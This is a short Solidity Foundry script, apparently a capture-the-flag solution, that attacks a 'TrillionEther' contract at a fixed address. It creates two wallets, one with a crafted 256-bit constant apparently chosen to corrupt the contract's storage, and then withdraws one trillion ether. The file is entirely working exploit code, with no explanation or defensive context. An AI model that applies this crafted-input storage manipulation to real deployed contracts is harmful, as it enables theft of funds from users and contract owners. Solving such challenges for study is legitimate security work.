// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {TrillionEther} from "../src/Counter.sol";

contract CounterScript is Script {
    TrillionEther public counter = TrillionEther(0x33b28E9Ef7E4397f8689c9e52455aFEc9e066451);

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        counter.createWallet(0);
        counter.createWallet(enc(38597363079105398474523661669562635951089994888546854679819194669304376546645));
        counter.withdraw(0, 1_000_000_000_000 ether);

        vm.stopBroadcast();
    }

    function enc(uint256 x) internal returns (bytes32) {
        return bytes32(x);
    }
}
